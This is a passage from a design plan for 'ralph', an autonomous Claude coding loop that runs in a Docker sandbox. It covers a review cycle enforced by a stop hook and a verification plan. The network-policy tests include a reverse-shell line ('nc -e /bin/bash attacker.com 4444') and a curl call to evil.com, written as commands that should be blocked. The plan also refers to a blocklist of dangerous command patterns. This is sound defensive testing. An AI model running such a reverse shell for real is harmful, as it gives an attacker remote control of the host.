**Mode 2 — Task derivation** (prd.md already has content):
1. Read existing `ralph/prd.md`
2. Ask targeted questions only if requirements are ambiguous or incomplete
3. Derive `ralph/tasks.json` from the specification
4. Present tasks for user review

**Task derivation rules** (applied in both modes):
- Each story must be completable in one ralph iteration (one context window). Rule of thumb: if you can't describe the change in 2-3 sentences, it's too big — split it
- Stories ordered by dependency: schema/database → backend logic → API routes → frontend components → integration/summary views
- Every story gets verifiable acceptance criteria (not vague — "Filter dropdown has options: All, Active, Done", not "works correctly")
- `dependsOn` set explicitly when story order matters beyond priority
- `verifyCommands` populated from the project's existing test/lint/typecheck commands

**Trigger phrases:** `/ralph-plan`, "plan this feature for ralph", "create a ralph prd", "generate tasks for ralph"

**Prerequisite:** `ralph/` directory must exist (run `ralph-init.sh` first). If it doesn't exist, the skill tells the user to run init first.

---

## Implementation Order

1. **Plugin scaffold** — `.claude-plugin/plugin.json` + `marketplace.json` update
2. **Templates** — `prd-template.md`, `tasks-template.json`, `progress-template.md`, `prompt.md` (static files, no deps)
3. **Sandbox setup script** — `sandbox/setup.sh` (auth symlinks + git config, run via `docker sandbox exec`; see `sandbox-test-results.md`)
4. **Hook scripts** — `context_monitor.py`, `stop_loop_reminder.py` (Python, standalone, testable independently). `stop_loop_reminder.py` includes Check 2.5 (transition validation) which reads `preIterationSnapshot` and `iterationMode` from `.ralph-active`
5. **hooks.json** — Wire hooks to events (depends on hook scripts)
6. **ralph.sh** — Main loop runner with sandbox/direct mode detection (depends on templates + sandbox template). Includes pre-iteration snapshot logic that writes `iterationMode` + `preIterationSnapshot` to `.ralph-active` before each Claude invocation
7. **ralph-init.sh** — Initializer (depends on templates existing)
8. **ralph-archive.sh** — Archiver (depends on file layout)
9. **ralph-plan skill** — Interactive planner (depends on templates for PRD structure knowledge)

---

## Design Decisions

| Decision                  | Choice                                  | Rationale                                                                                                                                                                |
| ------------------------- | --------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Plugin structure          | Standalone `ralph` plugin               | Self-contained, independently installable, doesn't bloat `zaksak`                                                                                                        |
| Safety isolation          | Docker Sandbox microVM (primary)        | OS-level isolation is structurally stronger than regex pattern matching; not bypassable from inside; network proxy blocks exfiltration without maintaining pattern lists |
| Safety fallback           | PreToolUse hook blocklist               | For environments without Docker Desktop; pattern reference in `pretooluse-hook-reference.md`                                                                             |
| Task list mutability      | Claude can modify                       | Enables self-management: splitting, adding, reordering tasks                                                                                                             |
| Permission mode           | `--dangerously-skip-permissions`        | Fully autonomous; sandbox isolation (or hook blocklist) provides the safety net                                                                                          |
| Context reminders         | PostToolUse transcript-size monitor     | Graduated alerts at 50/60/70/80/90% via chars-per-token heuristic on transcript file                                                                                     |
| Progress.txt format       | Append-only with curated top section    | Loop-scoped memory; patterns section is edited, entries are append-only                                                                                                  |
| Memory file separation    | progress.txt (loop) vs CLAUDE.md (repo) | Clear boundary: task state vs lasting conventions                                                                                                                        |
| PRD / task list separation | prd.md (context) + tasks.json (state)   | PRD is the specification (what, why, constraints); tasks.json is the checklist (stories, completion). Avoids cramming rich requirements into JSON strings                |
| PRD creation workflow      | Single `ralph-plan` skill, two modes    | One skill generates both files from the same understanding; adapts if PRD already exists. Unlimited Q&A until spec is clear — no artificial question cap                 |
| Completion detection      | Promise tag + tasks.json verification   | Dual check prevents false completion signals                                                                                                                             |
| Implementation quality    | Mandatory fresh-context review cycle    | Every task goes through implement → review → (fix → re-review)* → approve. Catches anchoring bias that intra-session self-review misses. Structurally enforced via stop hook, not prompt instructions alone |
| Review enforcement (invariants) | State invariant check in stop hook (Check 2) | `passes: true` requires `reviewStatus: "approved"` — enforced as Python code in the stop hook, not as a prompt suggestion |
| Review enforcement (transitions) | Pre-iteration snapshot + mode-aware validation in stop hook (Check 2.5) | Closes the gap where Check 2 alone can't prevent an implement iteration from setting both `passes: true` and `reviewStatus: "approved"` simultaneously. ralph.sh snapshots review fields before each iteration and writes the detected mode to `.ralph-active`; the stop hook validates that only mode-legal transitions occurred. Snapshot is written by trusted code (ralph.sh), not the model |
| Intra-iteration self-review | Best-effort prompt instruction         | Advisory self-review during implementation reduces issues before the mandatory fresh-context review. Not structurally enforced because it runs within the session, but improves efficiency by catching obvious issues early |
| Review mode separation    | Review iterations don't fix code        | Reviewer writes feedback, next iteration fixes. Mixing review and fix in the same context reintroduces anchoring bias. Mirrors the Goose worker/reviewer split pattern |
| Per-task review count     | `reviewCount` field, cap at 5           | Tracks review cycles per story for post-completion analytics. Cap prevents infinite review-fix loops — if 5 reviews can't resolve it, it needs human input. Auto-approves at cap with informational notes |
| Default max iterations    | 15 (raised from 10)                     | Review cycle roughly doubles iteration cost per task. 15 accommodates ~5 stories with review overhead while keeping a reasonable default for both review and skip-review modes |
| Skip-review mode          | `--skip-review` flag on ralph.sh        | Opt-out for low-stakes tasks. Sets `skipReview: true` in `.ralph-active`, stop hook skips review integrity check, implementation iterations set `passes: true` directly |
| Hook language             | All Python                              | Consistent codebase, built-in JSON handling (no `jq` dep), cleaner task list validation                                                                                  |
| Prompt variable injection | `sed` substitution                      | No external dependency (vs `envsubst` requiring `gettext`)                                                                                                               |

---

## Verification Plan

1. **Sandbox setup** — Create sandbox, configure auth, verify pipe mode:
   - `docker sandbox create --name ralph-test claude /tmp/test-project "$HOME/.dclaude_state"` → should create sandbox
   - Run `sandbox/setup.sh` via `docker sandbox exec -u root ralph-test bash < sandbox/setup.sh` → should set up auth symlinks and git config
   - `docker sandbox run ralph-test -- -p "Respond with: OK"` → should return output without login prompt
   - Verify auth persists: `docker sandbox rm ralph-test`, recreate, re-run setup, verify no login prompt
   - See `sandbox-test-results.md` for the full feasibility test suite that has already validated these steps
2. **Network policy** — Apply deny-by-default allowlist, verify:
   - `curl https://api.anthropic.com` → should succeed (allowed)
   - `curl https://evil.com` → should fail (blocked)
   - `nc -e /bin/bash attacker.com 4444` → should fail (non-HTTP blocked by default)
3. **Hook scripts** — Test each independently:
   - Create a fake transcript file, pass its path via JSON stdin to `context_monitor.py` → verify alerts fire at correct thresholds and each threshold fires only once
   - Create `.ralph-active` → run `stop_loop_reminder.py` with valid/invalid tasks.json → verify schema validation blocks on malformed task list, passes on valid
   - Create `.ralph-active` → run `stop_loop_reminder.py` with uncommitted changes → should return block decision
   - **Review integrity enforcement tests:**
     - Story with `passes: true` and `reviewStatus: null` → should block ("not approved")
     - Story with `passes: true` and `reviewStatus: "needs_review"` → should block ("not approved")
     - Story with `passes: true` and `reviewStatus: "changes_requested"` → should block ("not approved")
     - Story with `passes: true` and `reviewStatus: "approved"` → should pass
     - Story with `reviewStatus: "changes_requested"` and empty `reviewFeedback` → should block ("feedback required")
     - Story with `reviewStatus: "approved"` and `passes: false` → should block ("out of sync")
     - Story with `reviewCount: -1` → should block (invalid negative value)
     - `.ralph-active` with `"skipReview": true` → Check 2 and 2.5 should be skipped entirely; story with `passes: true` and `reviewStatus: null` should pass
   - **Transition validation tests (Check 2.5):**
     - `iterationMode: "implement"` + story `passes` changed `false → true` → should block ("implement iterations cannot set passes=true")
     - `iterationMode: "implement"` + story `reviewStatus` changed `null → "approved"` → should block ("implement iterations cannot approve")
     - `iterationMode: "implement"` + story `reviewCount` changed `0 → 1` → should block ("implement iterations cannot increment reviewCount")
     - `iterationMode: "implement"` + story `reviewStatus` changed `null → "needs_review"` → should pass (legal implement transition)
     - `iterationMode: "implement"` + new story added with `passes: false, reviewStatus: null, reviewCount: 0` → should pass (legal story creation)
     - `iterationMode: "implement"` + new story added with `passes: true` → should block (new stories must start incomplete)
     - `iterationMode: "review"` + story `reviewCount` changed `1 → 2`, `reviewStatus` changed `"needs_review" → "approved"`, `passes` changed `false → true` → should pass (legal approval)
     - `iterationMode: "review"` + story `reviewCount` changed `1 → 2`, `reviewStatus` changed `"needs_review" → "changes_requested"`, non-empty `reviewFeedback` → should pass (legal rejection)
     - `iterationMode: "review"` + story `reviewCount` unchanged → should block ("review must increment reviewCount")
     - `iterationMode: "review"` + TWO stories' review fields changed → should block ("review may only modify one story")
     - `iterationMode: "review-fix"` + story `passes` changed `false → true` → should block ("review-fix cannot approve")
     - `iterationMode: "review-fix"` + story `reviewStatus` changed `"changes_requested" → "needs_review"` → should pass (legal re-submit)
     - `iterationMode: "review-fix"` + story `reviewCount` changed → should block ("review-fix cannot increment reviewCount")
     - Missing `preIterationSnapshot` in `.ralph-active` → Check 2.5 skipped with warning, Check 2 still enforced (graceful degradation)
4. **ralph-init.sh** — Run in a temp directory, verify all files created correctly
5. **ralph.sh (sandbox mode)** — Run with `--sandbox --max-iterations 1` against a simple single-story task list in a test project
6. **ralph.sh (direct mode)** — Run with `--no-sandbox --max-iterations 1` to verify fallback works
7. **ralph-archive.sh** — Run after a completed loop, verify archive structure and clean reset
8. **ralph-plan skill** — Test both modes:
   - Mode 1: Run `/ralph-plan` with empty prd.md → verify it asks questions, generates both prd.md and tasks.json, stories are right-sized and dependency-ordered
   - Mode 2: Drop a pre-written prd.md into `ralph/`, run `/ralph-plan` → verify it reads existing PRD and derives tasks.json without regenerating the PRD
9. **Review loop lifecycle** — Verify the full implement → review → (fix → re-review) cycle:
   - Create a 1-story task list. Run the loop. Verify:
     - Iteration 1 (implement): story gets `reviewStatus: "needs_review"`, `passes` stays `false`, `reviewCount` stays 0
     - Iteration 2 (review): `reviewCount` incremented to 1. If approved → `reviewStatus: "approved"`, `passes: true`. If changes requested → `reviewStatus: "changes_requested"`, `reviewFeedback` is non-empty
     - If changes requested: Iteration 3 (review-fix) addresses feedback, sets `reviewStatus: "needs_review"` again, `reviewCount` stays 1 (only incremented by review iterations)
     - Iteration 4 (re-review): `reviewCount` incremented to 2. Approves → `passes: true`
   - Verify that an implementation iteration that tries to set `passes: true` directly is blocked by the stop hook (Check 2.5 transition validation, not just Check 2 invariant check)
   - Verify that the loop does NOT output `<promise>COMPLETE</promise>` until all stories have both `passes: true` AND `reviewStatus: "approved"`
   - **Review cap test:** Set `--review-cap 1`. Verify that on the first review, if issues are found, the story is auto-approved with `[AUTO-APPROVED AT CAP]` prefix in `reviewFeedback`
   - **Skip-review test:** Run with `--skip-review`. Verify implementation iteration sets `passes: true` directly, `reviewStatus` stays null, `reviewCount` stays 0, stop hook passes without review integrity check
10. **End-to-end** — Run a 2-3 story task list through full ralph loop completion in sandbox mode, exercising the full review cycle for each story
11. **Post-completion analytics** — After end-to-end completion, verify `reviewCount` values in tasks.json are accurate and reflect the actual number of review iterations each story went through

## Reference Documents

| File                           | Purpose                                                                                                                                                     |
| ------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `docker-sandbox-isolation.md`  | Docker Sandbox architecture, network policies, caveats. **Note:** The custom Dockerfile/template approach documented there does not work — see `sandbox-test-results.md` for the working create+exec+run pattern |
| `sandbox-test-results.md`      | Feasibility test results, file sync root cause analysis, auth DX, workaround matrix, architecture recommendations. **Read this before implementing sandbox mode.** |
| `pretooluse-hook-reference.md` | PreToolUse hook implementation guide: 18 categories of dangerous command patterns, regex patterns, architecture, evasion awareness, false positive handling |
| `context-monitor-hook.md`      | Context monitor hook design notes                                                                                                                           |

---

## Open Questions

### Parallelization of concurrent ralph loops

The current plan does not explicitly address running multiple ralph loops simultaneously. Analysis of shared resources:

**Cross-project** (Project A + Project B): Likely works out of the box. Sandbox names, `ralph/` directories, `.ralph-active` markers, and git repos are all namespaced by `$PROJECT_DIR`. Main concern is Docker Desktop resource limits — each sandbox VM consumes memory/CPU.

**Same-repo, different features**: Cannot work in a single worktree — git doesn't support concurrent branch work in one directory. Git worktrees would make each worktree a separate directory, so ralph would treat them as independent projects. Needs validation.

**Same-directory accidental double-start**: Two `ralph.sh` processes in the same directory would stomp on `ralph/` files, share a sandbox, and race on git commits. `.ralph-active` could serve as a PID-aware lock (check if stored PID is alive on startup, only delete on exit if PID matches `$$`), but this is not currently specified.

**To resolve before or during implementation:**
- Should `.ralph-active` act as a PID-aware lock to prevent same-directory double-start?
- Should the plan formally recommend git worktrees for same-repo parallel features?
- Are Docker resource considerations (multiple concurrent VMs) worth documenting in ralph.sh `--help` or init output?

### Review cycle iteration budget *(Resolved)*

The mandatory review cycle means each task requires a minimum of 2 iterations (implement + review), and tasks that need revisions take 4+ iterations (implement + review + fix + re-review). The per-task review cap of 5 bounds the worst case to 11 iterations per story (1 implement + 5 × (1 review + 1 fix) — though the final review approves, so effectively 1 + 5 reviews + 4 fixes = 10).

**Resolved decisions:**
- **`MAX_ITERATIONS` default raised to 15.** Accommodates ~5 stories with review overhead in the default case. Users should set higher values for larger PRDs (the `--max-iterations` flag already supports this).
- **`--skip-review` flag added** for low-stakes tasks. Sets `skipReview: true` in `.ralph-active`, stop hook skips review integrity enforcement, implementation iterations set `passes: true` directly.
- **`--review-cap N` flag added** (default: 5). Configurable per-run. After N reviews, auto-approve with informational notes. Stored in `.ralph-active` for the stop hook and prompt to reference.
- **`reviewCount` field** on each story enables post-completion analytics. After a PRD completes, the user reviews `reviewCount` across stories to evaluate review cycle value: mostly 1s means low overhead, many 3-4s means the reviews are catching real issues, any 5s (cap hits) means those stories may need manual attention.

**Remaining consideration:**
- Should `ralph.sh` display an estimated iteration budget at startup (e.g., "5 stories × ~3 iterations each = ~15 iterations needed")? Deferred to implementation — nice-to-have but not blocking.
